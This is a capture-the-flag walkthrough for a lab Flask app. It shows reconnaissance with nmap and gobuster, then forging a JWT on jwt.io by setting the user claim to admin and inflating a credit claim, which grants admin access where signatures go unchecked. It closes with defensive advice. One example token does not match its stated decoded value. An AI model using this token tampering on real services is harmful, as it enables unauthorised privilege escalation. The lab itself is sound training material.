# TryHeartMe - JWT Privilege Escalation Walkthrough

**Target:** Flask application on 10.49.133.54:5000  
**Objective:** Gain admin access via JWT manipulation

---

## Step 1: Reconnaissance

Scan the target:
```bash
sudo nmap -sC -sV 10.49.133.54
```

**Result:**
- Port 22: SSH
- Port 5000: Python Flask server

---

## Step 2: Web Application Enumeration

Enumerate directories:
```bash
gobuster dir -u http://10.49.133.54:5000 -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt
```

**Findings:**
- /login (Status: 200)
- /register (Status: 200)
- /account (Status: 302) → redirects to /login
- /admin (Status: 302) → redirects to /login

**Analysis:** Authentication is required. Look for JWT tokens.

---

## Step 3: Identify Authentication Mechanism

Visit the homepage and check browser storage (F12 → Application → Cookies/Storage).

**Discovery:** JWT token found in browser storage.

**Why This Matters:** The application uses JWT for session management. If we can modify the JWT, we can escalate privileges.

---

## Step 4: Extract and Decode JWT

Copy the JWT token and visit **jwt.io**

**JWT Structure:**
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoidXNlciIsImNyZWRpdCI6IjEwMCJ9.
[signature]`

**Decode the payload (middle section):**
```json
{
  "user": "user",
  "credit": "0"
}
```

**Analysis:** The payload contains claims we can manipulate.

---

## Step 5: Modify JWT Claims ⭐

**On jwt.io:**
1. Change `"user": "user"` → `"user": "admin"`
2. Change `"credit": "0"` → `"credit": "9999999"`
3. Signature verification is likely disabled

**New Payload:**
```json
{
  "user": "admin",
  "credit": "9999999"
}
```

---

## Step 6: Generate New JWT Token

jwt.io will generate a new token with modified claims:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWRtaW4iLCJjcmVkaXQiOiI5OTk5OTk5In0.
[new signature]


---

## Step 7: Replace Token in Browser

1. Open browser DevTools (F12)
2. Go to Application → Cookies or Local Storage
3. Replace the old JWT with the new one
4. Refresh the page

**Result:** You're now logged in as admin!

---

## Step 8: Access Admin Panel

Navigate to: `http://10.49.133.54:5000/admin`

Click on one of the product to buy with credits, and there is the flag.

**Success:** Admin panel accessible. Flag retrieved! 🚩

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Scan target | Found Flask on 5000 |
| 2 | Enumerate dirs | Found /login, /admin, /account |
| 3 | Check storage | Found JWT token |
| 4 | Decode JWT | Identified claims: user, credit |
| 5 | Modify claims | Changed user→admin, credit→9999999 |
| 6 | Generate token | New JWT created |
| 7 | Replace token | Pasted new JWT in storage |
| 8 | Access admin | Flag retrieved ✅ |

---

## Why This Works

1. **No Signature Verification** - Server doesn't validate JWT signature
2. **Trusted Claims** - Role based on user claim without verification
3. **No Backend Validation** - User role not re-checked on backend
4. **Simple Claims Structure** - Easy to identify and modify

---

## Defense Against JWT Manipulation

✅ Always verify JWT signature with server secret key  
✅ Never trust token claims without backend validation  
✅ Implement role-based access control on backend  
✅ Use HTTPS only to prevent token interception  
✅ Set token expiration (short-lived tokens)  
✅ Implement token rotation  
✅ Log and monitor token usage  

---

**Lesson:** JWTs are not magic security tokens. They're only secure if properly implemented with signature verification and backend validation.